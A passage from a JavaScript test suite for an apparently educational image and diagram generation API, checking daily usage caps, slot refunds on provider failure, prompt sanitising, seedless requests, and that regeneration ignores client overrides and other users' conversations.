      await GlobalImageUsage.findOneAndUpdate(
        { date: today },
        { count: 10 },
        { upsert: true, new: true }
      );

      try {
        // Direct image mode -> 429 global limit reached
        const resDirect = await request(server)
          .post('/api/ask')
          .set('Authorization', authGenImgUser)
          .send({
            question: 'draw a picture of chloroplast',
            mode: 'image',
          });

        assert.equal(resDirect.status, 429);
        assert.match(resDirect.body.message, /global image generation limit reached/i);
      } finally {
        await GlobalImageUsage.deleteMany({ date: today });
        if (origModel) process.env.GEMINI_IMAGE_MODEL = origModel;
        if (origProvider) process.env.IMAGE_PROVIDER = origProvider;
        if (origCap) process.env.IMAGE_DAILY_GLOBAL_CAP = origCap;
      }
    });

    it('9.20 GET /api/ask/conversations/:id does not duplicate messages and stored SVG size is capped at 60 KB', async () => {
      // Create a test conversation with an SVG under 100 KB total limit
      const largeSvgContent = '<svg viewBox="0 0 100 100">' + '<path d="M0 0 L10 10"/>'.repeat(2500) + '</svg>';
      const sanitized = sanitizeSvg(largeSvgContent);
      assert.ok(sanitized.svg, 'Sanitized SVG should be valid and under 100 KB');

      const conv = await Conversation.create({
        user: genImgUser._id,
        title: 'Test SVG Capping Conversation',
        messages: [
          {
            role: 'user',
            content: 'Generate a detailed diagram',
            mode: 'svg',
          },
          {
            role: 'assistant',
            content: sanitized.svg.slice(0, MAX_STORED_SVG_BYTES),
            svg: sanitized.svg.slice(0, MAX_STORED_SVG_BYTES),
            description: 'Large test diagram',
            mode: 'svg',
          },
        ],
      });

      const convRes = await request(server)
        .get(`/api/ask/conversations/${conv._id}`)
        .set('Authorization', authGenImgUser);

      assert.equal(convRes.status, 200);
      // Verify no top-level "conversation" field duplicating "messages"
      assert.equal(convRes.body.conversation, undefined, 'Must not duplicate conversation object at top level');
      assert.ok(Array.isArray(convRes.body.messages));
      assert.equal(convRes.body.messages.length, 2);
      assert.ok(convRes.body.messages[1].svg.length <= MAX_STORED_SVG_BYTES, 'Stored SVG must be capped at 60 KB');

      await Conversation.deleteOne({ _id: conv._id });
    });

    it('9.21 12 parallel image requests: exactly 5 succeed and 7 receive 429 rate limit', async () => {
      const origModel = process.env.GEMINI_IMAGE_MODEL;
      const origProvider = process.env.IMAGE_PROVIDER;
      process.env.IMAGE_PROVIDER = 'gemini';
      process.env.GEMINI_IMAGE_MODEL = 'gemini-3.1-flash-lite-image';
      const today = getKolkataDateString();

      // Create a fresh test user to avoid hitting the windowMs limit of askRateLimiter (30/15m)
      const parallelUser = await User.create({
        name: 'Parallel Test Student',
        email: `parallel_${Date.now()}@test.edu`,
        password: 'password123',
      });
      const authParallelUser = `Bearer ${jwt.sign({ id: parallelUser._id }, getJwtSecret(), { expiresIn: '1h' })}`;

      await AskUsage.deleteMany({ user: parallelUser._id });
      await GlobalImageUsage.deleteMany({ date: today });

      const fakeBase64 = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
      const mockFetch = mock.method(global, 'fetch', async () => ({
        ok: true,
        status: 200,
        json: async () => ({
          candidates: [
            {
              content: {
                parts: [
                  { text: 'Biology diagram illustration' },
                  { inlineData: { mimeType: 'image/png', data: fakeBase64 } },
                ],
              },
            },
          ],
        }),
      }));

      try {
        const requests = Array.from({ length: 12 }, (_, i) =>
          request(server)
            .post('/api/ask')
            .set('Authorization', authParallelUser)
            .send({
              question: `Draw an image of biology cell part ${i + 1}`,
              mode: 'image',
            })
        );

        const responses = await Promise.all(requests);
        const succeeded = responses.filter((r) => r.status === 200);
        const rateLimited = responses.filter((r) => r.status === 429);

        assert.equal(succeeded.length, 5, `Expected exactly 5 to succeed, got ${succeeded.length}`);
        assert.equal(rateLimited.length, 7, `Expected exactly 7 to be 429 rate-limited, got ${rateLimited.length}`);

        for (const r of rateLimited) {
          assert.match(r.body.message, /Daily image generation limit reached/i);
        }

        const finalUsage = await AskUsage.findOne({ user: parallelUser._id, date: today });
        assert.equal(finalUsage.imageCount, 5, 'User imageCount must be exactly 5');
      } finally {
        mockFetch.mock.restore();
        if (origModel) {
          process.env.GEMINI_IMAGE_MODEL = origModel;
        } else {
          delete process.env.GEMINI_IMAGE_MODEL;
        }
        if (origProvider) {
          process.env.IMAGE_PROVIDER = origProvider;
        } else {
          delete process.env.IMAGE_PROVIDER;
        }
        await AskUsage.deleteMany({ user: parallelUser._id });
        await GlobalImageUsage.deleteMany({ date: today });
        await User.deleteOne({ _id: parallelUser._id });
      }
    });

    it('9.22 in Generate Image mode, if provider fails, refunds slot and returns SVG diagram with note', async () => {
      const origAccount = process.env.CF_ACCOUNT_ID;
      const origToken = process.env.CF_API_TOKEN;
      const origProvider = process.env.IMAGE_PROVIDER;
      process.env.IMAGE_PROVIDER = 'cloudflare';
      process.env.CF_ACCOUNT_ID = 'cf-test-account-id';
      process.env.CF_API_TOKEN = 'cf-test-token-xyz';
      const today = getKolkataDateString();

      // Ensure fresh usage
      await AskUsage.deleteMany({ user: genImgUser._id, date: today });
      await GlobalImageUsage.deleteMany({ date: today });

      // Stub Cloudflare fetch to simulate upstream failure (e.g. 500)
      const mockFetch = mock.method(global, 'fetch', async () => ({
        ok: false,
        status: 500,
        json: async () => ({
          errors: [{ code: 10009, message: 'Internal Cloudflare AI server error' }],
        }),
      }));

      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
      const mockFallback = mock.method(
        geminiConfig,
        'generateWithModelFallback',
        async () => `=== DESCRIPTION ===
Diagram of the water cycle
=== SVG ===
<svg viewBox="0 0 400 200" xmlns="http://www.w3.org/2000/svg"><rect width="400" height="200" fill="#e0f2fe"/><text x="200" y="100" text-anchor="middle" font-size="16" fill="#0369a1">Water Cycle Diagram</text></svg>`
      );

      try {
        const usageBefore = await AskUsage.findOne({ user: genImgUser._id, date: today });
        assert.equal(usageBefore?.imageCount || 0, 0);

        const res = await request(server)
          .post('/api/ask')
          .set('Authorization', authGenImgUser)
          .send({
            question: 'generate an image of the water cycle',
            mode: 'image',
          });

        assert.equal(res.status, 200, 'Must return 200 instead of 503');
        assert.equal(res.body.mode, 'svg');
        assert.equal(res.body.resolvedMode, 'svg');
        assert.ok(res.body.svg);
        assert.match(res.body.svg, /<svg/i);
        assert.equal(res.body.fallback, true);
        assert.equal(res.body.note, 'Image service is busy, here is a diagram instead.');
        assert.ok(res.body.conversationId);

        // Verify slot was refunded: imageCount must be 0
        const usageAfter = await AskUsage.findOne({ user: genImgUser._id, date: today });
        assert.equal(usageAfter?.imageCount || 0, 0, 'imageCount must be refunded back to 0');
        // Normal ask count was recorded for the SVG diagram
        assert.equal(usageAfter?.count || 0, 1, 'Standard ask count should be 1');

        // Verify GlobalImageUsage count was also refunded
        const globalUsage = await GlobalImageUsage.findOne({ date: today });
        assert.equal(globalUsage?.count || 0, 0, 'Global image count must be refunded back to 0');

        // Verify conversation history
        const conv = await Conversation.findById(res.body.conversationId);
        assert.ok(conv);
        assert.equal(conv.messages.length, 2);
        assert.equal(conv.messages[1].mode, 'svg');
        assert.ok(conv.messages[1].svg);
      } finally {
        mockFetch.mock.restore();
        mockGetClient.mock.restore();
        mockFallback.mock.restore();
        if (origAccount) {
          process.env.CF_ACCOUNT_ID = origAccount;
        } else {
          delete process.env.CF_ACCOUNT_ID;
        }
        if (origToken) {
          process.env.CF_API_TOKEN = origToken;
        } else {
          delete process.env.CF_API_TOKEN;
        }
        if (origProvider) {
          process.env.IMAGE_PROVIDER = origProvider;
        } else {
          delete process.env.IMAGE_PROVIDER;
        }
      }
    });

    it('9.23 image provider request body includes appended no-text instruction and strips label/text requests', async () => {
      const origAccount = process.env.CF_ACCOUNT_ID;
      const origToken = process.env.CF_API_TOKEN;
      process.env.CF_ACCOUNT_ID = 'cf-test-acc';
      process.env.CF_API_TOKEN = 'cf-test-tok';

      // 1. Unit test stripTextAndLabelRequests
      assert.equal(stripTextAndLabelRequests('draw a plant cell with labels and add text'), 'draw a plant cell');
      assert.equal(stripTextAndLabelRequests('draw a cell, labelled'), 'draw a cell');
      assert.equal(stripTextAndLabelRequests('draw mitochondria and label the parts'), 'draw mitochondria');

      // 2. Integration with generateCloudflareImage: verify fetch body
      let capturedBody = null;
      const fakePngBase64 = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
      const mockFetch = mock.method(global, 'fetch', async (url, opts) => {
        if (opts?.body) {
          capturedBody = JSON.parse(opts.body);
        }
        return {
          ok: true,
          status: 200,
          json: async () => ({
            success: true,
            result: { image: fakePngBase64 },
          }),
        };
      });

      try {
        const studentPrompt = 'Draw an animal cell with labels and add text';
        const res = await generateCloudflareImage(studentPrompt);
        assert.ok(res.image);
        assert.ok(capturedBody, 'Cloudflare request body must be sent');
        assert.equal(capturedBody.steps, 4);

        // Verify no-text instruction appended
        assert.ok(
          capturedBody.prompt.includes('Clean illustration, no text, no letters, no words, no labels, no captions, no watermark.'),
          'Prompt must contain appended no-text instruction'
        );

        // Verify label and add text requests stripped
        assert.ok(!capturedBody.prompt.toLowerCase().includes('with labels'), 'Prompt must strip "with labels"');
        assert.ok(!capturedBody.prompt.toLowerCase().includes('add text'), 'Prompt must strip "add text"');
      } finally {
        mockFetch.mock.restore();
        if (origAccount) process.env.CF_ACCOUNT_ID = origAccount;
        else delete process.env.CF_ACCOUNT_ID;
        if (origToken) process.env.CF_API_TOKEN = origToken;
        else delete process.env.CF_API_TOKEN;
      }
    });

    it('9.24 POST /api/ask with mode image returns keyParts (3-6 bullet points) from text model and persists them', async () => {
      const origAccount = process.env.CF_ACCOUNT_ID;
      const origToken = process.env.CF_API_TOKEN;
      const origProvider = process.env.IMAGE_PROVIDER;
      process.env.IMAGE_PROVIDER = 'cloudflare';
      process.env.CF_ACCOUNT_ID = 'cf-test-acc';
      process.env.CF_API_TOKEN = 'cf-test-tok';
      const today = getKolkataDateString();

      await AskUsage.deleteMany({ user: genImgUser._id, date: today });
      await GlobalImageUsage.deleteMany({ date: today });

      let capturedImageBody = null;
      const fakePngBase64 = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
      const mockFetch = mock.method(global, 'fetch', async (url, opts) => {
        if (opts?.body) {
          capturedImageBody = JSON.parse(opts.body);
        }
        return {
          ok: true,
          status: 200,
          json: async () => ({
            success: true,
            result: { image: fakePngBase64 },
          }),
        };
      });

      const mockFallback = mock.method(
        geminiConfig,
        'generateWithModelFallback',
        async () => `- Nucleus: Controls genetic expression and cell division
- Mitochondria: Performs cellular respiration generating ATP
- Ribosomes: Protein synthesizers in the cytoplasm
- Endoplasmic Reticulum: Folded membranes facilitating transport`
      );

      try {
        const res = await request(server)
          .post('/api/ask')
          .set('Authorization', authGenImgUser)
          .send({
            question: 'draw an animal cell with labels',
            mode: 'image',
          });

        assert.equal(res.status, 200);
        assert.equal(res.body.mode, 'image');
        assert.ok(res.body.image);
        assert.ok(Array.isArray(res.body.keyParts));
        assert.equal(res.body.keyParts.length, 4);
        assert.match(res.body.keyParts[0], /Nucleus/i);
        assert.match(res.body.keyParts[1], /Mitochondria/i);

        // Verify Cloudflare request body had the no-text instruction and stripped "with labels"
        assert.ok(capturedImageBody);
        assert.ok(capturedImageBody.prompt.includes('Clean illustration, no text, no letters, no words, no labels, no captions, no watermark.'));
        assert.ok(!capturedImageBody.prompt.toLowerCase().includes('with labels'));

        // Verify conversation persistence
        const conv = await Conversation.findById(res.body.conversationId);
        assert.ok(conv);
        assert.equal(conv.messages.length, 2);
        const assistantMsg = conv.messages[1];
        assert.equal(assistantMsg.mode, 'image');
        assert.ok(Array.isArray(assistantMsg.keyParts));
        assert.equal(assistantMsg.keyParts.length, 4);
      } finally {
        mockFetch.mock.restore();
        mockFallback.mock.restore();
        if (origAccount) process.env.CF_ACCOUNT_ID = origAccount;
        else delete process.env.CF_ACCOUNT_ID;
        if (origToken) process.env.CF_API_TOKEN = origToken;
        else delete process.env.CF_API_TOKEN;
        if (origProvider) process.env.IMAGE_PROVIDER = origProvider;
        else delete process.env.IMAGE_PROVIDER;
      }
    });

    it('9.25 cloudflare flux-1-schnell sends only prompt and steps (4), request body has no seed field, and returns no seed', async () => {
      const origAccount = process.env.CF_ACCOUNT_ID;
      const origToken = process.env.CF_API_TOKEN;
      process.env.CF_ACCOUNT_ID = 'cf-test-acc';
      process.env.CF_API_TOKEN = 'cf-test-tok';

      const fakePngBase64 = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
      let capturedBody = null;
      const mockFetch = mock.method(global, 'fetch', async (url, opts) => {
        if (opts?.body) {
          capturedBody = JSON.parse(opts.body);
        }
        return {
          ok: true,
          status: 200,
          json: async () => ({
            success: true,
            result: { image: fakePngBase64 },
          }),
        };
      });

      try {
        const resA = await generateCloudflareImage('Draw an atom');
        assert.ok(capturedBody);
        assert.equal(capturedBody.steps, 4);
        assert.strictEqual(capturedBody.seed, undefined, 'Request body must not contain seed');
        assert.strictEqual('seed' in capturedBody, false, 'capturedBody must not have seed property');
        assert.deepStrictEqual(Object.keys(capturedBody).sort(), ['prompt', 'steps']);
        assert.strictEqual(resA.seed, undefined, 'Returned value must not have seed');
      } finally {
        mockFetch.mock.restore();
        if (origAccount) process.env.CF_ACCOUNT_ID = origAccount;
        else delete process.env.CF_ACCOUNT_ID;
        if (origToken) process.env.CF_API_TOKEN = origToken;
        else delete process.env.CF_API_TOKEN;
      }
    });

    it('9.26 image generation stores imagePrompt on message in Conversation (no imageSeed), and NEVER stores image bytes', async () => {
      const origAccount = process.env.CF_ACCOUNT_ID;
      const origToken = process.env.CF_API_TOKEN;
      const origProvider = process.env.IMAGE_PROVIDER;
      process.env.IMAGE_PROVIDER = 'cloudflare';
      process.env.CF_ACCOUNT_ID = 'cf-test-acc';
      process.env.CF_API_TOKEN = 'cf-test-tok';
      const today = getKolkataDateString();

      await AskUsage.deleteMany({ user: genImgUser._id, date: today });
      await GlobalImageUsage.deleteMany({ date: today });

      const fakePngBase64 = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
      const mockFetch = mock.method(global, 'fetch', async () => ({
        ok: true,
        status: 200,
        json: async () => ({
          success: true,
          result: { image: fakePngBase64 },
        }),
      }));

      const mockFallback = mock.method(
        geminiConfig,
        'generateWithModelFallback',
        async () => `- Chloroplast: Organelle for photosynthesis\n- Grana: Thylakoid stacks`
      );

      try {
        const studentPrompt = 'Draw chloroplast structure';
        const res = await request(server)
          .post('/api/ask')
          .set('Authorization', authGenImgUser)
          .send({
            question: studentPrompt,
            mode: 'image',
          });

        assert.equal(res.status, 200);
        assert.equal(res.body.imagePrompt, studentPrompt);
        assert.strictEqual(res.body.imageSeed, undefined, 'API response must not contain imageSeed');
        assert.ok(res.body.conversationId);

        // Verify MongoDB Conversation document
        const conv = await Conversation.findById(res.body.conversationId);
        assert.ok(conv);
        assert.equal(conv.messages.length, 2);
        const assistantMsg = conv.messages[1];

        // imagePrompt must be stored, imageSeed must not be stored
        assert.equal(assistantMsg.imagePrompt, studentPrompt);
        assert.strictEqual(assistantMsg.imageSeed, undefined, 'Conversation message must not store imageSeed');

        // CRITICAL: image bytes must NEVER be stored
        assert.equal(assistantMsg.image, undefined);
        assert.equal(assistantMsg.data, undefined);
        const serialized = JSON.stringify(conv.toObject());
        assert.ok(!serialized.includes(fakePngBase64), 'Image base64 bytes must never be stored in MongoDB');
      } finally {
        mockFetch.mock.restore();
        mockFallback.mock.restore();
        if (origAccount) process.env.CF_ACCOUNT_ID = origAccount;
        else delete process.env.CF_ACCOUNT_ID;
        if (origToken) process.env.CF_API_TOKEN = origToken;
        else delete process.env.CF_API_TOKEN;
        if (origProvider) process.env.IMAGE_PROVIDER = origProvider;
        else delete process.env.IMAGE_PROVIDER;
      }
    });

    it('9.27 GET /api/ask/conversations/:id returns imagePrompt and no imageSeed', async () => {
      const conv = await Conversation.create({
        user: genImgUser._id,
        title: 'Test Stored Prompt Conversation',
        messages: [
          { role: 'user', content: 'Draw a plant cell', mode: 'image' },
          {
            role: 'assistant',
            content: 'Educational illustration for: Draw a plant cell',
            mode: 'image',
            generatedImage: true,
            imagePrompt: 'Draw a plant cell',
            keyParts: ['Cell Wall: Cellulose barrier', 'Vacuole: Central storage'],
          },
        ],
      });

      try {
        const res = await request(server)
          .get(`/api/ask/conversations/${conv._id}`)
          .set('Authorization', authGenImgUser);

        assert.equal(res.status, 200);
        assert.ok(Array.isArray(res.body.messages));
        assert.equal(res.body.messages.length, 2);
        const assistantMsg = res.body.messages[1];
        assert.equal(assistantMsg.imagePrompt, 'Draw a plant cell');
        assert.strictEqual(assistantMsg.imageSeed, undefined, 'API response must not return imageSeed');
      } finally {
        await Conversation.deleteOne({ _id: conv._id });
      }
    });

    it('9.28 POST /api/ask regenerate reuses stored imagePrompt, request body has no seed, ignores client prompt/seed overrides, and bytes never stored', async () => {
      const origAccount = process.env.CF_ACCOUNT_ID;
      const origToken = process.env.CF_API_TOKEN;
      const origProvider = process.env.IMAGE_PROVIDER;
      process.env.IMAGE_PROVIDER = 'cloudflare';
      process.env.CF_ACCOUNT_ID = 'cf-test-acc';
      process.env.CF_API_TOKEN = 'cf-test-tok';
      const today = getKolkataDateString();

      await AskUsage.deleteMany({ user: genImgUser._id, date: today });
      await GlobalImageUsage.deleteMany({ date: today });

      const storedPrompt = 'Draw mitochondria inner membrane';

      const conv = await Conversation.create({
        user: genImgUser._id,
        title: 'Mitochondria Chat',
        messages: [
          { role: 'user', content: storedPrompt, mode: 'image' },
          {
            role: 'assistant',
            content: 'Educational illustration for: Draw mitochondria inner membrane',
            mode: 'image',
            generatedImage: true,
            imagePrompt: storedPrompt,
            keyParts: ['Cristae: Infolded inner membrane folds'],
          },
        ],
      });

      const messageId = conv.messages[1]._id;

      let capturedBody = null;
      const fakePngBase64 = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
      const mockFetch = mock.method(global, 'fetch', async (url, opts) => {
        if (opts?.body) {
          capturedBody = JSON.parse(opts.body);
        }
        return {
          ok: true,
          status: 200,
          json: async () => ({
            success: true,
            result: { image: fakePngBase64 },
          }),
        };
      });

      try {
        // Attempt regenerate while sending malicious prompt and seed overrides
        const res = await request(server)
          .post('/api/ask')
          .set('Authorization', authGenImgUser)
          .send({
            regenerate: {
              conversationId: conv._id,
              messageId,
            },
            question: 'HACKED_CLIENT_QUESTION',
            prompt: 'HACKED_CLIENT_PROMPT',
            seed: 999999999,
          });

        assert.equal(res.status, 200);
        assert.ok(res.body.image);
        assert.equal(res.body.imagePrompt, storedPrompt);
        assert.strictEqual(res.body.imageSeed, undefined, 'API response must not return imageSeed');

        // Verify provider request body sent the EXACT stored prompt, NOT client overrides
        assert.ok(capturedBody);
        assert.strictEqual(capturedBody.seed, undefined, 'Request body must not contain seed');
        assert.strictEqual('seed' in capturedBody, false, 'No seed property in capturedBody');
        assert.equal(capturedBody.steps, 4);
        assert.ok(capturedBody.prompt.includes('mitochondria inner membrane'), 'Must use stored imagePrompt');
        assert.ok(!capturedBody.prompt.includes('HACKED'), 'Must not trust client prompt override');

        // Verify bytes are never stored in MongoDB
        const updatedConv = await Conversation.findById(conv._id);
        const serialized = JSON.stringify(updatedConv.toObject());
        assert.ok(!serialized.includes(fakePngBase64), 'Image base64 bytes must never be stored on regenerate');
      } finally {
        mockFetch.mock.restore();
        await Conversation.deleteOne({ _id: conv._id });
        if (origAccount) process.env.CF_ACCOUNT_ID = origAccount;
        else delete process.env.CF_ACCOUNT_ID;
        if (origToken) process.env.CF_API_TOKEN = origToken;
        else delete process.env.CF_API_TOKEN;
        if (origProvider) process.env.IMAGE_PROVIDER = origProvider;
        else delete process.env.IMAGE_PROVIDER;
      }
    });

    it('9.29 regenerate returns 404 for another user\'s conversation or non-existent message', async () => {
      // Create user B's conversation
      const userB = await User.create({
        name: 'User B',
        email: `user_b_${Date.now()}@test.edu`,
        password: 'password123',
      });
      const convB = await Conversation.create({
        user: userB._id,
        title: 'User B Private Image Chat',
        messages: [
          { role: 'user', content: 'Draw a nucleus', mode: 'image' },
          {
            role: 'assistant',
            content: 'Illustration',
            mode: 'image',
            generatedImage: true,
            imagePrompt: 'Draw a nucleus',
          },
        ],
      });

      try {
        // User A attempts to regenerate User B's conversation -> 404
        const resOther = await request(server)
          .post('/api/ask')
          .set('Authorization', authGenImgUser)
          .send({
            regenerate: {
              conversationId: convB._id,
              messageId: convB.messages[1]._id,
            },
          });

        assert.equal(resOther.status, 404);
        assert.match(resOther.body.message, /not found or does not belong to you/i);

        // User B attempts to regenerate non-existent messageId in their own conversation -> 404
        const authUserB = `Bearer ${jwt.sign({ id: userB._id }, getJwtSecret(), { expiresIn: '1h' })}`;
        const resMissingMsg = await request(server)
          .post('/api/ask')
          .set('Authorization', authUserB)
          .send({
            regenerate: {
              conversationId: convB._id,
              messageId: new mongoose.Types.ObjectId(),
            },
          });

        assert.equal(resMissingMsg.status, 404);
        assert.match(resMissingMsg.body.message, /message not found/i);
      } finally {
        await Conversation.deleteOne({ _id: convB._id });
        await User.deleteOne({ _id: userB._id });
      }
    });

    it('9.30 regenerate daily cap (5 images) and slot refund on provider failure apply', async () => {
      const origAccount = process.env.CF_ACCOUNT_ID;
      const origToken = process.env.CF_API_TOKEN;
      const origProvider = process.env.IMAGE_PROVIDER;
      process.env.IMAGE_PROVIDER = 'cloudflare';
      process.env.CF_ACCOUNT_ID = 'cf-test-acc';
      process.env.CF_API_TOKEN = 'cf-test-tok';
      const today = getKolkataDateString();

      const conv = await Conversation.create({
        user: genImgUser._id,
        title: 'Cap Test Conversation',
        messages: [
          { role: 'user', content: 'Draw ribosome', mode: 'image' },
          {
            role: 'assistant',
            content: 'Ribosome illustration',
            mode: 'image',
            generatedImage: true,
            imagePrompt: 'Draw ribosome',
          },
        ],
      });

      const messageId = conv.messages[1]._id;

      try {
        // 1. Set user imageCount to 5 -> regenerate returns 429
        await AskUsage.findOneAndUpdate(
          { user: genImgUser._id, date: today },
          { count: 5, imageCount: 5 },
          { upsert: true }
        );

        const resCapped = await request(server)
          .post('/api/ask')
          .set('Authorization', authGenImgUser)
          .send({
            regenerate: {
              conversationId: conv._id,
              messageId,
            },
          });

        assert.equal(resCapped.status, 429);
        assert.match(resCapped.body.message, /Daily image generation limit reached/i);

        // 2. Reset user imageCount to 0, simulate provider failure -> slot refunded
        await AskUsage.findOneAndUpdate(
          { user: genImgUser._id, date: today },
          { count: 0, imageCount: 0 },
          { upsert: true }
        );
        await GlobalImageUsage.deleteMany({ date: today });

        const mockFetchFail = mock.method(global, 'fetch', async () => ({
          ok: false,
          status: 500,
          json: async () => ({
            errors: [{ code: 10009, message: 'Cloudflare Workers AI internal error' }],
          }),
        }));

        try {
          const resFail = await request(server)
            .post('/api/ask')
            .set('Authorization', authGenImgUser)
            .send({
              regenerate: {
                conversationId: conv._id,
                messageId,
              },
            });

          assert.equal(resFail.status, 503);

          // Verify slot was refunded: imageCount remains 0
          const usageAfter = await AskUsage.findOne({ user: genImgUser._id, date: today });
          assert.equal(usageAfter?.imageCount || 0, 0, 'imageCount must be refunded back to 0 on failure');

          const globalUsageAfter = await GlobalImageUsage.findOne({ date: today });
          assert.equal(globalUsageAfter?.count || 0, 0, 'Global image count must be refunded back to 0 on failure');
        } finally {
          mockFetchFail.mock.restore();
        }
      } finally {
        await Conversation.deleteOne({ _id: conv._id });
        await AskUsage.deleteMany({ user: genImgUser._id, date: today });
        await GlobalImageUsage.deleteMany({ date: today });
        if (origAccount) process.env.CF_ACCOUNT_ID = origAccount;
        else delete process.env.CF_ACCOUNT_ID;
        if (origToken) process.env.CF_API_TOKEN = origToken;
        else delete process.env.CF_API_TOKEN;
        if (origProvider) process.env.IMAGE_PROVIDER = origProvider;
        else delete process.env.IMAGE_PROVIDER;
      }
    });
  });
});

